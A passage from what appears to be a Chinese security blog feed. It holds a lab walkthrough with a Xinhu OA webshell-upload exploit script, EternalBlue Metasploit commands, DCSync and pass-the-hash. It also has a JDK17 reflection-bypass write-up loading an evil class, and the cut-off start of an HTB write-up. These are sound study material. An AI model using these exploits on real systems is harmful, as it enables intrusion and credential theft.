    <content type="html"><![CDATA[<h2 id="thinkphp漏洞利用">thinkphp漏洞利用</h2><p>访问看到是一个登录界面</p><img src="/post/6b005d5/IMAGE20250306114659325.png" class=""><p>掏出thinkphp工具打一下</p><img src="/post/6b005d5/IMAGE20250306115026261.png" class=""><h2 id="mysql提权">mysql提权</h2><img src="/post/6b005d5/IMAGE20250306115219432.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure><img src="/post/6b005d5/IMAGE20250306115243752.png" class=""><p>上传fscan工具扫描一波内网</p><img src="/post/6b005d5/IMAGE20250306115716447.png" class=""><p>发现有一个信呼办公系统，上传代理，代理出来访问看看。</p><h2 id="信呼oa-nday">信呼oa nday</h2><img src="/post/6b005d5/IMAGE20250306120013518.png" class=""><p>掏出nday打一波，现在脚本目录新建一个1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">session = requests.session()  </span><br><span class="line">  </span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span>  </span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span>  </span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span>  </span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">data1 = &#123;  </span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">r = session.post(url1, data=data1)  </span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)  </span><br><span class="line">  </span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])  </span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span>  </span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>)  </span><br><span class="line"><span class="built_in">print</span>(filepath)  </span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">r = session.get(url3)  </span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><img src="/post/6b005d5/IMAGE20250306120327850.png" class=""><p>成功上传了一个phpwebshell，在连接上去看看</p><img src="/post/6b005d5/IMAGE20250306120547570.png" class=""><h2 id="永恒之蓝">永恒之蓝</h2><p>在fscan的记录中还有一个ms_17_010的洞，直接上msf打一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole </span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid </span><br><span class="line">set RHOSTS 172.22.1.21 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/post/6b005d5/IMAGE20250306121001253.png" class=""><p>利用成功，当前这台主机是DC所以去导出hash使用dcsync</p><h2 id="dcsync">dcsync</h2><p>在DCSync技术没有出现之前，攻击者要想拿到域内用户的hash，就只能在域控制器上运行 Mimikatz 或 Invoke-Mimikatz去抓取密码hash，但是在2015 年 8 月份， Mimkatz新增了一个主要功能叫&quot;DCSync&quot;，使用这项技术可以有效地 “模拟” 域控制器并从目标域控上请求域内用户密码hash。</p><h3 id="原理">原理</h3><p>DCSync的原理是利用域控制器之间的数据同步复制<br>DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS- DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据，由于这种攻击利用了Windows RPC协议，并不需要登陆域控或者在域控上落地文件，避免触发EDR告警，因此DCSync时一种非常隐蔽的凭据窃取方式</p><p><strong>DCSync 攻击前提:</strong></p><p>想进行DCSync 攻击，必须获得以下任一用户的权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrators 组内的用户  </span><br><span class="line">Domain Admins 组内的用户  </span><br><span class="line">Enterprise Admins 组内的用户域控制器的计算机帐户  </span><br><span class="line">即：默认情况下域管理员组具有该权限</span><br></pre></td></tr></table></figure><p>可以参考：<a href="https://tttang.com/archive/1634/">https://tttang.com/archive/1634/</a></p><img src="/post/6b005d5/IMAGE20250306121316713.png" class=""><p>拿到hash之后直接读取文件利用crackmapexec</p><p><code>proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</code></p><img src="/post/6b005d5/IMAGE20250306121417124.png" class=""><p>拿到最后一个flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;thinkphp漏洞利用&quot;&gt;thinkphp漏洞利用&lt;/h2&gt;
&lt;p&gt;访问看到是一个登录界面&lt;/p&gt;
&lt;img src=&quot;/post/6b005d5/IMAGE20250306114659325.png&quot; class=&quot;&quot;&gt;
&lt;p&gt;掏出thinkphp工具打一下&lt;</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="域渗透" scheme="https://oceanzbz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>jdk17绕过反射限制</title>
    <link href="https://oceanzbz.github.io/post/b6e76ee6.html"/>
    <id>https://oceanzbz.github.io/post/b6e76ee6.html</id>
    <published>2025-02-17T11:20:11.000Z</published>
    <updated>2025-03-05T07:24:36.799Z</updated>
    
    <content type="html"><![CDATA[<p>今天看文章的时候看到一篇是在jdk17版本下的反射绕过，自己之前没了解过，细细读了一下觉得有必要记录一下。</p><h2 id="JDK9-模块化">JDK9 模块化</h2><p>Java模块化主要是用来解决依赖的问题，以及给原生JDK瘦身这两个作用。</p><p>在此之前，java项目一般都是由一堆class文件组成，管理这一堆class文件东西叫jar。但是这些class的有分两类，一类是我们自己项目的class，一类是各种依赖的class。jar可不会管他们之前的关系，他只是用来存放这些class的。所以一旦出现漏写某个依赖class所对应的jar，程序就会报&quot;ClassNotFoundException&quot;的异常了。</p><p>也正是为了避免这种问题，JDK9之后开始推行模块化，具体体现在：如果a.jar依赖于b.jar，那么对于a这个jar就需要写一份依赖说明，让a程序编译运行的时候能够直接定位到b.jar。这个功能主要就是通过<code>module-info.class</code>​中的定义的。</p><p>了解上述定义即可，现在主要是探究模块化关于漏洞利用这一块的限制。首先就是class的访问权限，一般就分为public protected private和默认的包访问限制，但是到了模块化之后折现访问权限就仅限于当前模块了，除非目标类所在模块明确在module-info中指出了该类可被外部调用，不然依然无法获取到。</p><h2 id="JDK17-强封装">JDK17 强封装</h2><p><a href="https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B">https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B</a></p><p>Oracle官方上述文档中提到了<code>Strong Encapsulation</code>​，这个主要就是针对<code>java*</code>​包下的所有非public字段的如果我们在JDK17的时候对<code>java*</code>​下的非公共字段进行反射调用的话就会直接报错。</p><p>其实这个东西在JDK9之后就开始被标记为了不安全选项,但是由于很多大型项目之前都会直接使用反射这个功能，所以直到JDK17才将其强制化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String payload=<span class="string">&quot;yv66vgAAAD0AIAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEABGNhbGMKAAgAEAwAEQASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwcAFAEAE2phdmEvbGFuZy9FeGNlcHRpb24HABYBABBvcmcvZXhhbXBsZS9FdmlsAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMb3JnL2V4YW1wbGUvRXZpbDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhACEAFQACAAAAAAACAAEABQAGAAEAFwAAAC8AAQABAAAABSq3AAGxAAAAAgAYAAAABgABAAAAAwAZAAAADAABAAAABQAaABsAAAAIABwABgABABcAAABPAAIAAQAAAA64AAcSDbYAD1enAARLsQABAAAACQAMABMAAwAYAAAAEgAEAAAABgAJAAgADAAHAA0ACQAZAAAAAgAAAB0AAAAHAAJMBwATAAABAB4AAAACAB8=&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes= Base64.getDecoder().decode(payload);</span><br><span class="line">        Method defineClass= ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;attack&quot;</span>, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常来说会直接弹出计算器但是运行确报错了</p><img src="/post/b6e76ee6/IMAGE20250217195327298.png" class=""><p>下面来介绍下如何使用 Unsafe来打破这个限制,定位到setAccessible</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(<span class="type">boolean</span> flag)</span> &#123;</span><br><span class="line">    AccessibleObject.checkPermission();</span><br><span class="line">    <span class="keyword">if</span> (flag) checkCanSetAccessible(Reflection.getCallerClass());</span><br><span class="line">    setAccessible0(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们给非public字段或方法设置访问权限为 <code>true</code> 时会调用<code>checkCanSetAccessible</code> 去检查对应的类。执行 <code>checkCanSetAccessible</code> 方法后会调用到 <code>java.lang.reflect.AccessibleObject#checkCanSetAccessible(java.lang.Class&lt;?&gt;, java.lang.Class&lt;?&gt;, boolean)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkCanSetAccessible</span><span class="params">(Class&amp;lt;?&amp;gt; caller,</span></span><br><span class="line"><span class="params">                                          Class&amp;lt;?&amp;gt; declaringClass,</span></span><br><span class="line"><span class="params">                                          <span class="type">boolean</span> throwExceptionIfDenied)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (caller == MethodHandle.class) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalCallerException</span>();   <span class="comment">// should not happen</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Module</span> <span class="variable">callerModule</span> <span class="operator">=</span> caller.getModule();</span><br><span class="line">        <span class="type">Module</span> <span class="variable">declaringModule</span> <span class="operator">=</span> declaringClass.getModule();</span><br><span class="line">        <span class="comment">//如果被调用的变量所在模块和调用者所在模块相同，返回true</span></span><br><span class="line">        <span class="keyword">if</span> (callerModule == declaringModule) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//如果调用者所在模块跟Object所在模块相同，则返回true</span></span><br><span class="line">        <span class="keyword">if</span> (callerModule == Object.class.getModule()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//如果被调用模块没有定义，则返回true</span></span><br><span class="line">        <span class="keyword">if</span> (!declaringModule.isNamed()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">pn</span> <span class="operator">=</span> declaringClass.getPackageName();</span><br><span class="line">        <span class="type">int</span> modifiers;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> <span class="keyword">instanceof</span> Executable) &#123;</span><br><span class="line">            modifiers = ((Executable) <span class="built_in">this</span>).getModifiers();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            modifiers = ((Field) <span class="built_in">this</span>).getModifiers();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果当前被调用属性值是public，那就直接返回true</span></span><br><span class="line">        <span class="comment">// class is public and package is exported to caller</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isClassPublic</span> <span class="operator">=</span> Modifier.isPublic(declaringClass.getModifiers());</span><br><span class="line">        <span class="keyword">if</span> (isClassPublic &amp;amp;&amp;amp; declaringModule.isExported(pn, callerModule)) &#123;</span><br><span class="line">            <span class="comment">// member is public</span></span><br><span class="line">            <span class="keyword">if</span> (Modifier.isPublic(modifiers)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果被调用属性是protected并且是static，返回true</span></span><br><span class="line">            <span class="comment">// member is protected-static</span></span><br><span class="line">            <span class="keyword">if</span> (Modifier.isProtected(modifiers)</span><br><span class="line">                &amp;amp;&amp;amp; Modifier.isStatic(modifiers)</span><br><span class="line">                &amp;amp;&amp;amp; isSubclassOf(caller, declaringClass)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果在模块define中，定义了该属性值是open的，返回true</span></span><br><span class="line">        <span class="comment">// package is open to caller</span></span><br><span class="line">        <span class="keyword">if</span> (declaringModule.isOpen(pn, callerModule)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (throwExceptionIfDenied) &#123;</span><br><span class="line">            <span class="comment">// not accessible</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to make &quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span> <span class="keyword">instanceof</span> Field)</span><br><span class="line">                msg += <span class="string">&quot;field &quot;</span>;</span><br><span class="line">            msg += <span class="built_in">this</span> + <span class="string">&quot; accessible: &quot;</span> + declaringModule + <span class="string">&quot; does not \&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (isClassPublic &amp;amp;&amp;amp; Modifier.isPublic(modifiers))</span><br><span class="line">                msg += <span class="string">&quot;exports&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                msg += <span class="string">&quot;opens&quot;</span>;</span><br><span class="line">            msg += <span class="string">&quot; &quot;</span> + pn + <span class="string">&quot;\&quot; to &quot;</span> + callerModule;</span><br><span class="line">            <span class="type">InaccessibleObjectException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InaccessibleObjectException</span>(msg);</span><br><span class="line">            <span class="keyword">if</span> (printStackTraceWhenAccessFails()) &#123;</span><br><span class="line">                e.printStackTrace(System.err);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>总结几个返回true的可能性：</p><ul><li>调用者所在模块和被调用者所在模块相同</li><li>调用者模块与Object类所在模块相同</li></ul><p>后续以及其他的还有的返回true的情况是该属性值本身的定义所决定的，我们无法改变。针对上面三种情况，我们可以通过unsafe模块来达成目的。</p><p>Unsafe模块的作用还有很多，属于是积累起来很不错的一块知识点，这里我们只记录如何通过Unsafe模块进行目标类所在moule进行修改，整体的思路为：获取Object中module属性的内存偏移量，之后再通过unsafe中方法，将Object的module属性set进我们当前操作类的module属性中。</p><h2 id="Unsafe修改类所属module">Unsafe修改类所属module</h2><p>Unsafe模块中有几个方法相关：</p><p><strong>1.objectFieldOffset</strong></p><img src="/post/b6e76ee6/IMAGE20250217201830277.png" class=""><p>用于获取给定类属性值的内存偏移量，用来找到module属性值的地方</p><p><strong>2.getAndSetObject</strong></p><img src="/post/b6e76ee6/IMAGE20250217201923765.png" class=""><p>用来根据内存偏移量以及具体值，来给指定对象的内存空间进行变量设置，跟反射的功能差不多。</p><p>其实具体的操作有上述两个方法已经足够了，但unsafe中能够根据内存偏移量和具体值进行set操作的方法可不止这一个，比如putObject也可以实现这个功能，并且方法调用的给值都是相同的。</p><p>落实到代码上如何写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">unsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);  </span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);  </span><br><span class="line">field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);  </span><br><span class="line"><span class="type">Module</span> <span class="variable">baseModule</span> <span class="operator">=</span> Object.class.getModule();  </span><br><span class="line"><span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> OracleSink.class;  </span><br><span class="line"><span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));  </span><br><span class="line">unsafe.getAndSetObject(currentClass, addr, baseModule);</span><br></pre></td></tr></table></figure><p>可能会有一个疑问：为什么我们获取到了Class的module内存偏移，就一定能够笃定当前类的内存偏移量与其相同呢？这个其实很好理解，因为所有的类都是继承自Class类的，并且module属性值不是某一个特定类的特定属性值，而是Class类中定义的，用于给所有类都设置的一段属性值，其他类是没有对其进行修改的，所以每一个类的module内存偏移量都是相同的48 然后就可以继续运行了。</p><h2 id="踩坑">踩坑</h2><p>在运行代码的时候会报错 sum.misc包不存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--add-modules=jdk.unsupported</span><br><span class="line">--add-opens=java.base/sun.nio.ch=ALL-UNNAMED</span><br></pre></td></tr></table></figure><img src="/post/b6e76ee6/IMAGE20250218002850352.png" class=""><p>参考文章：<br><a href="https://forum.butian.net/share/3748">https://forum.butian.net/share/3748</a><br><a href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/">https://pankas.top/2023/12/05/jdk17-反射限制绕过/</a><br><a href="https://aiwin.fun/index.php/archives/4389/">https://aiwin.fun/index.php/archives/4389/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天看文章的时候看到一篇是在jdk17版本下的反射绕过，自己之前没了解过，细细读了一下觉得有必要记录一下。&lt;/p&gt;
&lt;h2 id=&quot;JDK9-模块化&quot;&gt;JDK9 模块化&lt;/h2&gt;
&lt;p&gt;Java模块化主要是用来解决依赖的问题，以及给原生JDK瘦身这两个作用。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反射" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>Cat-HTB</title>
    <link href="https://oceanzbz.github.io/post/4da1391d.html"/>
    <id>https://oceanzbz.github.io/post/4da1391d.html</id>
    <published>2025-02-15T10:49:06.000Z</published>
    <updated>2025-03-05T07:24:36.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p><code>nmap -sC -sV -T4 -Pn 10.10.11.53</code></p><img src="/post/4da1391d/IMAGE20250215210535347.png" class=""><p>加入一下host映射然后访问</p><img src="/post/4da1391d/IMAGE20250215210736236.png" class=""><p>扫描下目录</p><img src="/post/4da1391d/IMAGE20250215210824198.png" class=""><p>发现存在git泄漏，用git-dumper下载一下。</p><p><code>git-dumper http://cat.htb/.git ./catgit</code></p><p>发现有源码泄漏那就看看源码有什么值得入手的地方</p><h2 id="代码审计">代码审计</h2><h3 id="xss">xss</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 